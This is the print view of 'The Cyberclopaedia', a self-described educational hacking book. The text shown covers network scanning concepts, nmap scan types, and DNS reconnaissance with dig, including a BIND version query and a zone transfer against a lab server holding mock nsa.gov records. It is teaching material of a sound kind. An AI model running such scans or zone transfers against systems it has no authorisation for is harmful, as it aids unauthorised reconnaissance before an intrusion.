<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>The Cyberclopaedia</title>
        <meta name="robots" content="noindex" />


        <!-- Custom HTML head -->
        
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

        <!-- MathJax -->
        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="index.html">Cyberclopaedia</a></li><li class="chapter-item "><a href="Reconnaissance/index.html">Reconnaissance</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/Active/index.html">Active</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/Active/nmap/index.html">nmap</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/Active/nmap/FIN, NULL & XMAS Scans.html">FIN, NULL & XMAS Scans</a></li><li class="chapter-item "><a href="Reconnaissance/Active/nmap/TCP SYN & TCP Connect scans.html">TCP SYN & TCP Connect scans</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/Active/DNS Server Enumeration (53).html">DNS Server Enumeration (53)</a></li><li class="chapter-item "><a href="Reconnaissance/Active/LDAP Enumeration (389, 636, 3268, 3269).html">LDAP Enumeration (389, 636, 3268, 3269)</a></li><li class="chapter-item "><a href="Reconnaissance/Active/SNMP Enumeration (161).html">SNMP Enumeration (161)</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/OSINT/index.html">OSINT</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/index.html">Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/recon-ng.html">recon-ng</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/theHarvester.html">theHarvester</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Domain Name Enumeration.html">Domain Name Enumeration</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Google Dorks.html">Google Dorks</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Harvesting E-Mails.html">Harvesting E-Mails</a></li></ol></li></ol></li><li class="chapter-item "><a href="Exploitation/index.html">Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/index.html">Binary Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Heap Exploitation/index.html">Heap Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Heap Exploitation/Use After Free (UAF).html">Use After Free (UAF)</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/index.html">Stack Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/Buffer Overflows.html">Buffer Overflows</a></li><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/Format String Vulnerabilities.html">Format String Vulnerabilities</a></li><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/Return to _dl_resolve.html">Return to _dl_resolve</a></li><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/Return-oriented programming (ROP).html">Return-oriented programming (ROP)</a></li></ol></li></ol></li><li class="chapter-item "><a href="Exploitation/DNS/index.html">DNS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/DNS/DNS Cache Poisoning.html">DNS Cache Poisoning</a></li><li class="chapter-item "><a href="Exploitation/DNS/DNS Traffic Amplification.html">DNS Traffic Amplification</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Web/index.html">Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/index.html">SQL Injection</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Cheatsheets.html">Cheatsheets</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Defences.html">Defences</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Finding SQLi.html">Finding SQLi</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Introduction.html">Introduction</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Union injections.html">Union injections</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Web/CRLF Injection.html">CRLF Injection</a></li><li class="chapter-item "><a href="Exploitation/Web/Cross-Site Request Forgery.html">Cross-Site Request Forgery</a></li><li class="chapter-item "><a href="Exploitation/Web/Cross-Site Scripting.html">Cross-Site Scripting</a></li><li class="chapter-item "><a href="Exploitation/Web/HTTP Parameter Pollution.html">HTTP Parameter Pollution</a></li><li class="chapter-item "><a href="Exploitation/Web/HTTP Response Splitting.html">HTTP Response Splitting</a></li><li class="chapter-item "><a href="Exploitation/Web/Open Redirect.html">Open Redirect</a></li><li class="chapter-item "><a href="Exploitation/Web/Template Injection.html">Template Injection</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Windows/index.html">Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Windows/SCF File Attacks.html">SCF File Attacks</a></li></ol></li></ol></li><li class="chapter-item "><a href="Post Exploitation/index.html">Post Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/index.html">Active Directory (AD)</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/Domain Data Enumeration with Bloodhound.html">Domain Data Enumeration with Bloodhound</a></li><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/Domain Enumeration with PowerView.html">Domain Enumeration with PowerView</a></li></ol></li><li class="chapter-item "><a href="Post Exploitation/Pivoting/index.html">Pivoting</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Pivoting/SSH Tunneling.html">SSH Tunneling</a></li><li class="chapter-item "><a href="Post Exploitation/Pivoting/Tunneling with Chisel.html">Tunneling with Chisel</a></li></ol></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/index.html">Reverse Engineering</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/index.html">Binary Formats</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/index.html">ELF</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/Dynamic Linking.html">Dynamic Linking</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/Reverse Engineering Android Applications.html">Reverse Engineering Android Applications</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/index.html">Program Anatomy</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/Instructions.html">Instructions</a></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/Registers.html">Registers</a></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/The Heap.html">The Heap</a></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/The Stack.html">The Stack</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with Ghidra/index.html">Reverse Engineering with Ghidra</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with Ghidra/Creating a Project and Loading a Binary.html">Creating a Project and Loading a Binary</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with Ghidra/Initial Analysis.html">Initial Analysis</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/index.html">Reverse Engineering with radare2</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Analysis.html">Analysis</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Binary Info.html">Binary Info</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Flags.html">Flags</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Seeking.html">Seeking</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Strings.html">Strings</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Assembly.html">Assembly</a></li><li class="chapter-item "><a href="Reverse Engineering/Basic Reverse Engineering using objdump, strace, and ltrace.html">Basic Reverse Engineering using objdump, strace, and ltrace</a></li></ol></li><li class="chapter-item "><a href="Malware Analysis/index.html">Malware Analysis</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Malware Analysis/Basic Static Analysis.html">Basic Static Analysis</a></li></ol></li><li class="chapter-item "><a href="Networking/index.html">Networking</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/DNS/index.html">DNS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/DNS/DNS Protocol.html">DNS Protocol</a></li><li class="chapter-item "><a href="Networking/DNS/The Domain Name System.html">The Domain Name System</a></li><li class="chapter-item "><a href="Networking/DNS/The in-addr.arpa Domain.html">The in-addr.arpa Domain</a></li></ol></li><li class="chapter-item "><a href="Networking/Networks/index.html">Networks</a></li><li class="chapter-item "><a href="Networking/Protocols/index.html">Protocols</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/Protocols/Network Time Protocol (NTP).html">Network Time Protocol (NTP)</a></li><li class="chapter-item "><a href="Networking/Protocols/Simple Network Management Protocol (SNMP).html">Simple Network Management Protocol (SNMP)</a></li></ol></li><li class="chapter-item "><a href="Networking/Network Address Translation (NAT).html">Network Address Translation (NAT)</a></li><li class="chapter-item "><a href="Networking/The OSI Model.html">The OSI Model</a></li></ol></li><li class="chapter-item "><a href="Cryptography/index.html">Cryptography</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Cryptography/Block Ciphers/index.html">Block Ciphers</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Cryptography/Block Ciphers/Encrypting Non-Conforming Messages.html">Encrypting Non-Conforming Messages</a></li><li class="chapter-item "><a href="Cryptography/Block Ciphers/Modes of Operation.html">Modes of Operation</a></li><li class="chapter-item "><a href="Cryptography/Block Ciphers/Padding Oracle Attack.html">Padding Oracle Attack</a></li></ol></li><li class="chapter-item "><a href="Cryptography/Stream Ciphers/index.html">Stream Ciphers</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Cryptography/Stream Ciphers/Hardware-Oriented Stream Ciphers/index.html">Hardware-Oriented Stream Ciphers</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Cryptography/Stream Ciphers/Hardware-Oriented Stream Ciphers/Grain-128a.html">Grain-128a</a></li></ol></li></ol></li><li class="chapter-item "><a href="Cryptography/Breaking Classical Cryptrography.html">Breaking Classical Cryptrography</a></li><li class="chapter-item "><a href="Cryptography/Principles of Modern Cryptography.html">Principles of Modern Cryptography</a></li></ol></li><li class="chapter-item "><a href="Web/index.html">Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Web/Duplicate HTTP Parameter Handling.html">Duplicate HTTP Parameter Handling</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">The Cyberclopaedia</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/cr0mll/cyberclopaedia/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="the-cyberclopaedia"><a class="header" href="#the-cyberclopaedia">The Cyberclopaedia</a></h1>
<p>This is an aspiring project aimed at accumulating knowledge from the world of cybersecurity and presenting it in a cogent way, so it is accessible to as large and audience as possible and so that everyone has a good resource to learn hacking from.</p>
<p>Experimental support for inline Mathjax is now provided using a <a href="https://github.com/cr0mll/mdbook-inline-mathjax">custom preprocessor</a>. If you find that any LaTeX is not rendered properly, please create a GitHub issue including the chapter name that contains the broken LaTeX. Furthermore, in this case you should view the Cyberclopaedia <a href="https://github.com/cr0mll/cyberclopaedia">here</a> on GitHub.</p>
<p><strong>Donate XMR:</strong> 862CjhjSMYGJ9paKwii4RR5sN4yNfHPHv4YyFsFVpyjLQ9ZLMR1DFNAYaNoXNceR33Hxf3Q9LtQNfW5Db4t4zCWSNnf6xgB</p>
<p><em>The information here is for educational purposes only and I do not bear any responsibility for your own actions.</em></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview"><a class="header" href="#overview">Overview</a></h1>
<p>Network scanning is the process of gathering information about a target via comlex reconnaissance techniques. The term &quot;network scanning&quot; refers to the procedures used for discovering hosts, ports, running services and information about the underlying OS type.</p>
<h2 id="types-of-scanning"><a class="header" href="#types-of-scanning">Types of scanning</a></h2>
<h3 id="port-scanning"><a class="header" href="#port-scanning">Port Scanning</a></h3>
<p>Lists the open ports and the services running on them. Port scanning describes the process of querying the running services on a computer by sending a stream of messages in an attempt to identify the service in question, as well as any information related to it. It involves probing TCP and UDP ports of a target system in order to determine if a service is running / listening.</p>
<h3 id="network-scanning"><a class="header" href="#network-scanning">Network Scanning</a></h3>
<p>This is the process of discovering active hosts on a network, either for attacking them or assessing the overall network security.</p>
<h3 id="vulnerability-scanning"><a class="header" href="#vulnerability-scanning">Vulnerability Scanning</a></h3>
<p>Reveals the presence of known vulnerabilities. It checks whether a system is exploitable through a set of weaknesses. Such a scanner consists of a catalog and a scanning engine. The catalog contains information about known vulnerabilities and exploits for them that work on a multitude of servers. The scanning engine is responsible for the logic behind the exploitation and analysis of the results.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-1"><a class="header" href="#introduction-1">Introduction</a></h1>
<p>Nmap is a free and open source port and network scanner, which may also be used for vulnerability scanning through its scripting engine - the NSE. </p>
<h1 id="syntax"><a class="header" href="#syntax">Syntax</a></h1>
<p>The syntax for nmap is as follows:</p>
<pre><code class="language-bash">nmap &lt;options&gt; target_range
</code></pre>
<p>It is always good practice to run Nmap with root privileges as they are required for some of the tool's functionality.</p>
<p>You can do a simple scan on a single IP through the following command:</p>
<pre><code class="language-bash">nmap &lt;IP&gt;
</code></pre>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/simple-nmap-scan.png" alt="" /></p>
<p>By default, Nmap scans the top 1000 most commonly used ports (these are not necssarily the ports 0-999). You can specify specific ports for scanning with the <code>-p</code> flag followed by a comma-separated list of ports. Specifying <code>-p-</code> will cause nmap to scan all ports (0-65535).</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/simple-nmap-scan-specific-ports.png" alt="" /></p>
<h1 id="port-states"><a class="header" href="#port-states">Port States</a></h1>
<ul>
<li><strong>open</strong> - an application is actively listening for TCP connections, UDP datagrams or SCTP associations on this port</li>
<li><strong>closed</strong> -  the port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it</li>
<li><strong>filtered</strong> - Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. Usually, the filter sends no response, so Nmap needs to resend the probe a few times in order to be sure that it wasn't dropped due to traffic congestion. This slows the scan drastically</li>
<li><strong>unfiltered</strong> - the port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, used for mapping firewall rulesets, may put ports in this state</li>
<li><strong>open|filtered</strong> - Nmap is unable to determine whether the port is open or filtered. This occurs for scan types in which open ports give no response</li>
<li><strong>closed|filtered</strong> - Nmap is unable to determine whether the port is closed or filtered. It is only used for the IP ID idle scan.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-1"><a class="header" href="#overview-1">Overview</a></h1>
<p>These scan types make use of a small loophole in the <a href="http://www.rfc-editor.org/rfc/rfc793.txt">TCP RFC</a> to differentiate between <code>open</code> and <code>closed</code> ports. RFC 793 dictates that &quot;if the destination port state is CLOSED .... an incoming segment not containing a RST causes a RST to be sent in response.” It also says the following about packets sent to open ports without the SYN, RST, or ACK bits set: “you are unlikely to get here, but if you do, drop the segment, and return&quot;.</p>
<p>Scanning systems compliant with this RFC text, any packet not containing <code>SYN</code>, <code>RST</code>, or <code>ACK</code> bits will beget an <code>RST</code> if the port is closed and no response at all if the port is open. So long as none of these flags are set, any combination of the other three (<code>FIN</code>, <code>PSH</code>, and <code>URG</code>) is fine.</p>
<p>These scan types can sneak through certain non-stateful firewalls and packet filtering routers and are a little more stealthy than even a SYN scan. However, not all systems are compliant with RFC 793 - some send a <code>RST</code> even if the port is open. Some operating systems that do this include Microsoft Windows, a lot of Cisco devices, IBM OS/400, and BSDI. These scans will work against most Unix-based systems.</p>
<p>It is not possible to distinguish an <code>open</code> from a <code>filtered</code> port with these scans, hence why the port states will be <code>open|filtered</code>.</p>
<h1 id="null-scan"><a class="header" href="#null-scan">Null Scan</a></h1>
<p>Doesn't set any flags. Since null scanning does not set any set flags, it can sometimes penetrate firewalls and edge routers that filter incoming packets with certain flags. It is invoked with the <code>-sN</code> option:</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/null-scan.png" alt="" /></p>
<h1 id="fin-scan"><a class="header" href="#fin-scan">FIN Scan</a></h1>
<p>Sets just the <code>FIN</code> bit to on. It is invoked with <code>-sF</code>:</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/fin-scan.png" alt="" /></p>
<h1 id="xmas-scan"><a class="header" href="#xmas-scan">Xmas Scan</a></h1>
<p>Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree. It is performed through the <code>-sX</code> option:</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/xmas-scan.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tcp-syn-scan"><a class="header" href="#tcp-syn-scan">TCP SYN Scan</a></h1>
<ul>
<li>The default scan type with root privileges (<code>-sS</code> option)</li>
<li>It does not complete a full TCP handshake, therefore it's a bit faster and used to be more silent (it is called a silent scan, although that is no longer the case)</li>
<li>Also known as a half-open scan</li>
</ul>
<p>You can use the <code>-sS</code> option or omit it entirely to perform a TCP SYN scan.</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-syn-scan.png" alt="" /></p>
<p>This type of scan works as follows:
Nmap sends a SYN packet to the target, initiating a TCP connection. The target responds with SYN ACK, telling Nmap that the port is accessible. Finally, Nmap terminates the connection before it's finished by issueing a RST packet.</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-syn-scan-wireshark.png" alt="" /></p>
<h1 id="tcp-connect-scan"><a class="header" href="#tcp-connect-scan">TCP Connect Scan</a></h1>
<ul>
<li>The default scan type when SYN scan isn't available - lacking root privileges (<code>-sT</code> option)</li>
<li>Nmap initiates a complete TCP connection with the target</li>
<li>The connection attempts are loggen onto the target</li>
<li>It's usually slower</li>
</ul>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-connect-scan.png" alt="" /></p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-connect-scan-wireshark.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="enumerating-bind-servers-with-chaos"><a class="header" href="#enumerating-bind-servers-with-chaos">Enumerating BIND servers with CHAOS</a></h1>
<p>The BIND software is the most commonly used name server software, which supports CHAOSNET queries. This can be used to query the name server for its software type and version. We are no longer querying the domain name system but are instead requesting information about the BIND instance. Our queries will still take the form of domain names - using <code>.bind</code> as the top-level domain. The results from such a query are returned as <code>TXT</code> records. Use the following syntax for quering BIND with the CHAOS class:</p>
<pre><code class="language-bash">dig @&lt;name server&gt; &lt;class&gt; &lt;domain name&gt; &lt;record type&gt;
</code></pre>
<pre><code class="language-bash">┌──(cr0mll@kali)-[~]-[]
└─\\(  dig @192.168.129.138 chaos version.bind txt 

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @192.168.129.138 chaos version.bind txt
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 38138
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;version.bind.                  CH      TXT

;; ANSWER SECTION:
version.bind.           0       CH      TXT     &quot;9.8.1&quot;

;; AUTHORITY SECTION:
version.bind.           0       CH      NS      version.bind.

;; Query time: 0 msec
;; SERVER: 192.168.129.138#53(192.168.129.138)
;; WHEN: Tue Sep 14 16:24:35 EEST 2021
;; MSG SIZE  rcvd: 73
</code></pre>
<p>Looking at the answer section, we see that this name server is running BIND 9.8.1. Other chaos records you can request are <code>hostname.bind</code>, <code>authors.bind</code>, and <code>server-id.bind</code>.</p>
<h1 id="dns-zone-transfer"><a class="header" href="#dns-zone-transfer">DNS Zone Transfer</a></h1>
<p>A <em>Zone transfer</em> request provides the means for copying a DNS zone file from one name server to another. This, however, only works over TCP. By doing this, you can obtain all the records of a DNS server for a particular zone. This is done through the <code>AXFR</code> request type:</p>
<pre><code class="language-bash">dig @&lt;name server&gt; AXFR &lt;domain&gt;
</code></pre>
<pre><code class="language-bash">┌──(cr0mll0@kali)-[~]-[]
└─ \\) dig @192.168.129.138 AXFR nsa.gov 

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @192.168.129.138 AXFR nsa.gov
; (1 server found)
;; global options: +cmd
nsa.gov.                3600    IN      SOA     ns1.nsa.gov. root.nsa.gov. 2007010401 3600 600 86400 600
nsa.gov.                3600    IN      NS      ns1.nsa.gov.
nsa.gov.                3600    IN      NS      ns2.nsa.gov.
nsa.gov.                3600    IN      MX      10 mail1.nsa.gov.
nsa.gov.                3600    IN      MX      20 mail2.nsa.gov.
fedora.nsa.gov.         3600    IN      TXT     &quot;The black sparrow password&quot;
fedora.nsa.gov.         3600    IN      AAAA    fd7f:bad6:99f2::1337
fedora.nsa.gov.         3600    IN      A       10.1.0.80
firewall.nsa.gov.       3600    IN      A       10.1.0.105
fw.nsa.gov.             3600    IN      A       10.1.0.102
mail1.nsa.gov.          3600    IN      TXT     &quot;v=spf1 a mx ip4:10.1.0.25 ~all&quot;
mail1.nsa.gov.          3600    IN      A       10.1.0.25
mail2.nsa.gov.          3600    IN      TXT     &quot;v=spf1 a mx ip4:10.1.0.26 ~all&quot;
mail2.nsa.gov.          3600    IN      A       10.1.0.26
ns1.nsa.gov.            3600    IN      A       10.1.0.50
ns2.nsa.gov.            3600    IN      A       10.1.0.51
prism.nsa.gov.          3600    IN      A       172.16.40.1
prism6.nsa.gov.         3600    IN      AAAA    ::1
sigint.nsa.gov.         3600    IN      A       10.1.0.101
snowden.nsa.gov.        3600    IN      A       172.16.40.1
vpn.nsa.gov.            3600    IN      A       10.1.0.103
web.nsa.gov.            3600    IN      CNAME   fedora.nsa.gov.
webmail.nsa.gov.        3600    IN      A       10.1.0.104
www.nsa.gov.            3600    IN      CNAME   fedora.nsa.gov.
xkeyscore.nsa.gov.      3600    IN      TXT     &quot;knock twice to enter&quot;
xkeyscore.nsa.gov.      3600    IN      A       10.1.0.100
nsa.gov.                3600    IN      SOA     ns1.nsa.gov. root.nsa.gov. 2007010401 3600 600 86400 600
;; Query time: 4 msec
;; SERVER: 192.168.129.138#53(192.168.129.138)
;; WHEN: Fri Sep 17 22:38:47 EEST 2021
;; XFR size: 27 records (messages 1, bytes 709)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-2"><a class="header" href="#introduction-2">Introduction</a></h1>
<p>LDAP (Lightweight Directory Access Protocol) is a protocol which enables the locating of organizations, individuals, and other resources such as files and devices in a network.</p>
<p>An LDAP directory may be split across multiple servers. Each server can have a version of the total directory which is periodically synchronized. An LDAP server is called a Directory System Agent (DSA).</p>
<p>LDAP directories are organised in a tree hierarchy as follows:</p>
<ul>
<li>The root directory</li>
<li>Countries</li>
<li>Organisations</li>
<li>Organisational units (OUs) - divisions and departments</li>
<li>Individuals - these can be people, files, printers, etc.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-3"><a class="header" href="#introduction-3">Introduction</a></h1>
<p>You will need working knowledge of <a href="Reconnaissance/Active/../../Networking/Protocols/Simple%20Network%20Management%20Protocol%20(SNMP).html">SNMP</a> in order to follow through.</p>
